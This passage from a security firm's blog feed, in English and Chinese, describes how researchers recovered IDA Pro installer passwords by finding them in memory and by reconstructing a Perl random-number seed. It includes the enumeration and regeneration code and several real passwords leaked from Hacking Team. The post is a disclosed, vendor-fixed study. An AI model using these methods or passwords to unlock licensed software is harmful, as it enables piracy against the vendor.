                        &lt;span class=&quot;n&quot;&gt;bufb&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_b&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
                        &lt;span class=&quot;n&quot;&gt;bufc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_c&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
                        &lt;span class=&quot;n&quot;&gt;bufd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_d&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
                        &lt;span class=&quot;n&quot;&gt;bufe&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_e&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
                        &lt;span class=&quot;n&quot;&gt;buff&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;

                &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;%s&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;bufa&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;%s&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;bufb&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;%s&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;bufc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;%s&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;bufd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;%s&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;bufe&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;%s&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buff&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;After a month, we finally generated the IDA Pro installation passwords successfully with Perl, and the correct charset ordering is &lt;code class=&quot;highlighter-rouge&quot;&gt;abcdefghijkmpqrstuvwxyzABCDEFGHJKLMPQRSTUVWXYZ23456789&lt;/code&gt;. For example, we can generate the hacking teamâ€™s leaked password &lt;code class=&quot;highlighter-rouge&quot;&gt;FgVQyXZY2XFk&lt;/code&gt; with the following script:&lt;/p&gt;

&lt;div class=&quot;language-perl highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;#!/usr/bin/env perl&lt;/span&gt;
&lt;span class=&quot;c1&quot;&gt;#&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;@_e&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;split&lt;/span&gt; &lt;span class=&quot;sr&quot;&gt;//&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;abcdefghijkmpqrstuvwxyzABCDEFGHJKLMPQRSTUVWXYZ23456789&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

&lt;span class=&quot;nv&quot;&gt;$i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;3326487116&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;srand&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$pw&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;12&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;nv&quot;&gt;$key&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;rand&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;54&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;nv&quot;&gt;$pw&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$pw&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_e&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;$i $pw\n&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;With this, we can build a dictionary of installation password, which effectively increase the efficiency of brute force attack. Generally, we can compute the password of one installer in 10 minutes.&lt;/p&gt;

&lt;p&gt;We have reported this issue to Hex-Rays, and they promised to harden the installation password immediately.&lt;/p&gt;

&lt;h2 id=&quot;summary&quot;&gt;Summary&lt;/h2&gt;

&lt;p&gt;In this article, we discussed the possibility of installing IDA Pro without owning installation password. In the end, we found plaintext password in the program memory of Linux and MacOS version. On the other hand, we determined the password generation methodology of Windows version. Therefore, we can build a dictionary to accelerate brute force attack. Finally, we can get one password at a reasonable time.&lt;/p&gt;

&lt;p&gt;We really enjoy this process: surmise wisely and prove it with our best. It can broaden our experience no matter the result is correct or not. This is why we took a whole month to verify such a difficult surmise. We also take this attitude in our &lt;a href=&quot;https://devco.re/en/services/red-team&quot;&gt;Red Team Assessment&lt;/a&gt;. You would love to give it a try!&lt;/p&gt;

&lt;p&gt;Lastly, we would like to thank for the friendly and rapid response from Hex-Rays. Although this issue is not included in &lt;a href=&quot;https://www.hex-rays.com/bugbounty.shtml&quot;&gt;Security Bug Bounty Program&lt;/a&gt;, they still generously awarded us IDA Pro Linux and MAC version, and upgraded the Windows version for us. We really appreciate it.&lt;/p&gt;

&lt;h2 id=&quot;timeline&quot;&gt;Timeline&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;Jan 31, 2019 - Report to Hex-Rays&lt;/li&gt;
  &lt;li&gt;Feb 01, 2019 - Hex-Rays promised to harden the installation password and reported to BitRock&lt;/li&gt;
  &lt;li&gt;Feb 11, 2019 - BitRock released InstallBuilder 19.2.0&lt;/li&gt;
&lt;/ul&gt;

</description>
                <link>https://devco.re/blog/2019/06/21/operation-crack-hacking-IDA-Pro-installer-PRNG-from-an-unusual-way-en/</link>
                <guid>https://devco.re/blog/2019/06/21/operation-crack-hacking-IDA-Pro-installer-PRNG-from-an-unusual-way-en</guid>
                <pubDate>Fri, 21 Jun 2019 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>ç ´å¯†è¡Œå‹•: ä»¥ä¸å°‹å¸¸çš„è§’åº¦ç ´è§£ IDA Pro å½éš¨æ©Ÿæ•¸</title>
                <description>&lt;p&gt;&lt;a href=&quot;/blog/2019/06/21/operation-crack-hacking-IDA-Pro-installer-PRNG-from-an-unusual-way-en/&quot;&gt;English Version&lt;/a&gt;&lt;br /&gt;
&lt;a href=&quot;/blog/2019/06/21/operation-crack-hacking-IDA-Pro-installer-PRNG-from-an-unusual-way/&quot;&gt;ä¸­æ–‡ç‰ˆæœ¬&lt;/a&gt;&lt;/p&gt;

&lt;h2 id=&quot;å‰è¨€&quot;&gt;å‰è¨€&lt;/h2&gt;

&lt;p&gt;Hex-Rays IDA Pro æ˜¯ç›®å‰ä¸–ç•Œä¸Šæœ€çŸ¥åçš„åçµ„è­¯å·¥å…·ï¼Œä»Šå¤©æˆ‘å€‘æƒ³ä¾†èŠèŠå®ƒçš„å®‰è£å¯†ç¢¼ã€‚ä»€éº¼æ˜¯å®‰è£å¯†ç¢¼ï¼Ÿä¸€èˆ¬ä¾†èªªï¼Œåœ¨å®Œæˆ IDA Pro è³¼è²·æµç¨‹å¾Œï¼Œæœƒæ”¶åˆ°ä¸€å€‹å®¢è£½åŒ–å®‰è£æª”åŠå®‰è£å¯†ç¢¼ï¼Œåœ¨ç¨‹å¼å®‰è£éç¨‹ä¸­ï¼Œæœƒéœ€è¦é‚£çµ„å®‰è£å¯†ç¢¼æ‰å¾—ä»¥ç¹¼çºŒå®‰è£ã€‚é‚£éº¼ï¼Œå¦‚æœä»Šå¤©åœ¨ç¶²è·¯ä¸Šç™¼ç¾ä¸€åŒ…æ´©æ¼çš„ IDA Pro å®‰è£æª”ï¼Œæˆ‘å€‘æœ‰å¯èƒ½åœ¨ä¸çŸ¥é“å¯†ç¢¼çš„ç‹€æ³ä¸‹é †åˆ©å®‰è£å—ï¼Ÿé€™æ˜¯ä¸€å€‹æœ‰è¶£çš„é–‹æ”¾æ€§å•é¡Œã€‚&lt;/p&gt;

&lt;p&gt;åœ¨æˆ‘å€‘åœ˜éšŠæˆå“¡è…¦åŠ›æ¿€ç›ªä¸‹ï¼Œçµ¦å‡ºäº†ä¸€å€‹é©—è­‰æ€§çš„ç­”æ¡ˆï¼šæ˜¯çš„ï¼Œåœ¨æœ‰ Linux æˆ– MacOS ç‰ˆå®‰è£æª”çš„ç‹€æ³ä¸‹ï¼Œæˆ‘å€‘å¯ä»¥ç›´æ¥æ‰¾åˆ°æ­£ç¢ºçš„å®‰è£å¯†ç¢¼ï¼›è€Œåœ¨æœ‰ Windows ç‰ˆå®‰è£æª”çš„ç‹€æ³ä¸‹ï¼Œæˆ‘å€‘åªéœ€è¦ååˆ†é˜å°±å¯ç®—å‡ºå®‰è£å¯†ç¢¼ã€‚&lt;/p&gt;

&lt;p&gt;ä¸‹é¢å°±æ˜¯æˆ‘å€‘çš„é©—è­‰æµç¨‹ï¼š&lt;/p&gt;

&lt;h3 id=&quot;-linux-ä»¥åŠ-macos-ç‰ˆ&quot;&gt;* Linux ä»¥åŠ MacOS ç‰ˆ&lt;/h3&gt;

&lt;p&gt;æœ€å…ˆé©—è­‰æˆåŠŸçš„æ˜¯ Linux åŠ MacOS ç‰ˆï¼Œé€™å…©å€‹ç‰ˆæœ¬éƒ½æ˜¯é€é InstallBuilder å°è£æˆå®‰è£æª”ã€‚æˆ‘å€‘å˜—è©¦åŸ·è¡Œå®‰è£ç¨‹å¼ï¼Œä¸¦åœ¨è¨˜æ†¶é«”ä¸­ç›´æ¥ç™¼ç¾äº†æœªåŠ å¯†çš„å®‰è£å¯†ç¢¼ã€‚ä»»å‹™é”æˆï¼&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20190621/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;åœ¨é€é Hex-Rays å”åŠ©å›å ±å¾Œï¼Œ&lt;a href=&quot;https://blog.bitrock.com/2019/02/installbuilder-1920-released.html&quot;&gt;BitRock&lt;/a&gt; ä¹Ÿåœ¨ 2019/02/11 é‡‹å‡ºäº† InstallBuilder 19.2.0ï¼ŒåŠ å¼·äº†å®‰è£å¯†ç¢¼çš„ä¿è­·ã€‚&lt;/p&gt;

&lt;h3 id=&quot;-windows-ç‰ˆ&quot;&gt;* Windows ç‰ˆ&lt;/h3&gt;

&lt;p&gt;åœ¨ Windows ç‰ˆä¸Šè§£æ±ºé€™å€‹å•é¡Œæ˜¯é …æŒ‘æˆ°ï¼Œå› ç‚ºé€™å€‹å®‰è£æª”æ˜¯é€é &lt;a href=&quot;http://www.jrsoftware.org/isinfo.php&quot;&gt;Inno Setup&lt;/a&gt; å°è£çš„ï¼Œå…¶å®‰è£å¯†ç¢¼æ˜¯æ¡ç”¨ &lt;a href=&quot;http://www.jrsoftware.org/ishelp/index.php?topic=setup_password&quot;&gt;160-bit SHA-1 hash&lt;/a&gt; çš„æ–¹å¼å„²å­˜ï¼Œå› æ­¤æˆ‘å€‘ç„¡æ³•é€ééœæ…‹ã€å‹•æ…‹ç¨‹å¼åˆ†æç›´æ¥å–å¾—å¯†ç¢¼ï¼Œé€éæš´åŠ›åˆ—èˆ‰ä¹Ÿä¸æ˜¯ä¸€å€‹æœ‰æ•ˆç‡çš„æ–¹å¼ã€‚ä¸éï¼Œå¦‚æœæˆ‘å€‘æŒæ¡äº†ç”¢ç”Ÿå¯†ç¢¼çš„æ–¹å¼ï¼Œé‚£çµæœå¯èƒ½å°±ä¸ä¸€æ¨£äº†ï¼Œæˆ‘å€‘ä¹Ÿè¨±å¯ä»¥æ›´æœ‰æ•ˆç‡çš„çª®èˆ‰ã€‚&lt;/p&gt;

&lt;p&gt;é›–ç„¶æˆ‘å€‘å·²ç¶“æœ‰äº†æ–¹å‘æ˜¯è¦æ‰¾å‡º Hex-Rays å¦‚ä½•ç”¢ç”Ÿå¯†ç¢¼ï¼Œä½†è¦å»é©—è­‰å»æ˜¯â€éå¸¸å›°é›£â€çš„ã€‚å› ç‚ºæˆ‘å€‘ä¸çŸ¥é“äº‚æ•¸ç”¢ç”Ÿå™¨æ˜¯ç”¨ä»€éº¼èªè¨€å¯¦ä½œçš„ï¼Œè€Œç›®å‰å·²çŸ¥è‡³å°‘æœ‰ &lt;a href=&quot;https://rosettacode.org/wiki/Random_number_generator_(included)&quot;&gt;88 ç¨®äº‚æ•¸ç”¢ç”Ÿå™¨&lt;/a&gt;ï¼Œç¨®é¡å¤ªå¤šäº†ã€‚åŒæ™‚ï¼Œæˆ‘å€‘ä¹Ÿç„¡æ³•çŸ¥é“äº‚æ•¸ç”¢ç”Ÿå™¨æ‰€ä½¿ç”¨çš„å­—å…ƒçµ„å’Œå­—å…ƒé †åºæ˜¯ä»€éº¼ã€‚&lt;/p&gt;

&lt;p&gt;è¦æ‰¾å‡ºäº‚æ•¸ç”¢ç”Ÿå™¨æ‰€ä½¿ç”¨çš„å­—å…ƒçµ„æ˜¯çœ¾å¤šå›°é›£äº‹ä¸­æ¯”è¼ƒç°¡å–®çš„ä¸€ä»¶ï¼Œé¦–å…ˆï¼Œæˆ‘å€‘ç«­ç›¡æ‰€èƒ½çš„æ”¶é›†æ‰€æœ‰ IDA Pro çš„å®‰è£å¯†ç¢¼ï¼Œä¾‹å¦‚ WikiLeaks æ‰€æ­éœ²çš„ hackingteam ä½¿ç”¨ä¹‹å¯†ç¢¼ï¼š&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;FgVQyXZY2XFk (&lt;a href=&quot;https://wikileaks.org/hackingteam/emails/emailid/62729&quot;&gt;link&lt;/a&gt;)&lt;/li&gt;
  &lt;li&gt;7ChFzSbF4aik (&lt;a href=&quot;https://wikileaks.org/hackingteam/emails/emailid/311769&quot;&gt;link&lt;/a&gt;)&lt;/li&gt;
  &lt;li&gt;ZFdLqEM2QMVe (&lt;a href=&quot;https://wikileaks.org/hackingteam/emails/emailid/62956&quot;&gt;link&lt;/a&gt;)&lt;/li&gt;
  &lt;li&gt;6VYGSyLguBfi (&lt;a href=&quot;https://wikileaks.org/hackingteam/emails/emailid/70250&quot;&gt;link&lt;/a&gt;)&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;å¾æ‰€æœ‰æ”¶é›†åˆ°çš„å®‰è£å¯†ç¢¼ä¸­æˆ‘å€‘æ•´ç†å‡ºæ‰€ç”¨åˆ°çš„å­—å…ƒçµ„ï¼š&lt;br /&gt;
&lt;code class=&quot;highlighter-rouge&quot;&gt;23456789ABCDEFGHJKLMPQRSTUVWXYZabcdefghijkmpqrstuvwxyz&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;å°‘äº† &lt;code class=&quot;highlighter-rouge&quot;&gt;1&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;I&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;l&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;0&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;O&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;o&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;N&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;n&lt;/code&gt; å­—å…ƒï¼Œæ¨æ¸¬é€™äº›éƒ½æ˜¯å®¹æ˜“æ··æ·†çš„å­—å…ƒï¼Œå› æ­¤ä¸æ”¾å…¥å¯†ç¢¼å­—å…ƒçµ„ä¸­æ˜¯åˆç†çš„ã€‚æ¥è‘—ï¼Œæˆ‘å€‘ç”¨é€™äº›å­—å…ƒçµ„ï¼ŒçŒœæ¸¬å¯èƒ½çš„æ’åˆ—é †åºï¼š&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;23456789ABCDEFGHJKLMPQRSTUVWXYZabcdefghijkmpqrstuvwxyz
ABCDEFGHJKLMPQRSTUVWXYZ23456789abcdefghijkmpqrstuvwxyz
23456789abcdefghijkmpqrstuvwxyzABCDEFGHJKLMPQRSTUVWXYZ
abcdefghijkmpqrstuvwxyz23456789ABCDEFGHJKLMPQRSTUVWXYZ
abcdefghijkmpqrstuvwxyzABCDEFGHJKLMPQRSTUVWXYZ23456789
ABCDEFGHJKLMPQRSTUVWXYZabcdefghijkmpqrstuvwxyz23456789
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;æœ€å¾Œï¼Œæˆ‘å€‘æŒ‘é¸å¹¾å€‹æ¯”è¼ƒå¸¸è¦‹çš„èªè¨€ï¼ˆc/php/python/perlï¼‰ä¸¦ä½¿ç”¨ä¸Šè¿°çš„å­—å…ƒçµ„å¯¦ä½œäº‚æ•¸ç”¢ç”Ÿå™¨ï¼Œåˆ—èˆ‰æ‰€æœ‰äº‚æ•¸çµ„åˆï¼Œçœ‹çœ‹æˆ‘å€‘æ”¶é›†åˆ°çš„å®‰è£å¯†ç¢¼æœ‰æ²’æœ‰å‡ºç¾åœ¨é€™äº›çµ„åˆä¸­ã€‚ä¾‹å¦‚æˆ‘å€‘ç”¨ä¸‹é¢ç¨‹å¼ç¢¼åˆ—èˆ‰ C èªè¨€çš„äº‚æ•¸çµ„åˆï¼š&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;#include&amp;lt;stdio.h&amp;gt;
#include&amp;lt;stdlib.h&amp;gt;
&lt;/span&gt;
&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;23456789ABCDEFGHJKLMPQRSTUVWXYZabcdefghijkmpqrstuvwxyz&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_b&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;ABCDEFGHJKLMPQRSTUVWXYZ23456789abcdefghijkmpqrstuvwxyz&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_c&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;23456789abcdefghijkmpqrstuvwxyzABCDEFGHJKLMPQRSTUVWXYZ&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_d&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;abcdefghijkmpqrstuvwxyz23456789ABCDEFGHJKLMPQRSTUVWXYZ&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_e&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;abcdefghijkmpqrstuvwxyzABCDEFGHJKLMPQRSTUVWXYZ23456789&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;ABCDEFGHJKLMPQRSTUVWXYZabcdefghijkmpqrstuvwxyz23456789&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;bufa&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;21&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
        &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;bufb&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;21&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
        &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;bufc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;21&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
